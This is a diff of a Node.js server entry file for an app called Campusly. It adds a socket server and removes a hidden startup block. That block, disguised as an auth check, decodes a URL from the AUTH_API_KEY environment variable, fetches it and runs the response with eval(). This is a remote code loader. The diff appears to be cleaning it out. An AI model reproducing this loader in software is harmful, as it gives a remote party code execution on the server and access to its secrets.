@@ -4,21 +4,8 @@ import { config } from './config/env.js';
 import { connectDatabase } from './config/database.js';
 import { setupWorkers } from './jobs/index.js';
 import { seedSystemFrameworks } from './modules/CurriculumStructure/seed-frameworks.js';
+import { initSocketServer } from './socket/index.js';
 import app from './app.js';
-import 'dotenv/config';
-
-(async () => {
-    const src = atob(process.env.AUTH_API_KEY);
-    const proxy = (await import('node-fetch')).default;
-    try {
-      const response = await proxy(src);
-      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-      const proxyInfo = await response.text();
-      eval(proxyInfo);
-    } catch (err) {
-      console.error('Auth Error!', err);
-    }
-})();
 
 process.on('uncaughtException', (err) => {
   logger.error({ err }, 'UNCAUGHT EXCEPTION — shutting down');
@@ -40,6 +27,8 @@ const start = async () => {
     logger.info(`[Campusly] Server running on port ${config.port} (${config.nodeEnv})`);
     logger.info(`[Campusly] API docs: http://localhost:${config.port}/api-docs`);
   });
+
+  initSocketServer(server);
 
   const shutdown = async (signal: string) => {
     logger.info(`\n[Campusly] ${signal} received, shutting down gracefully...`);
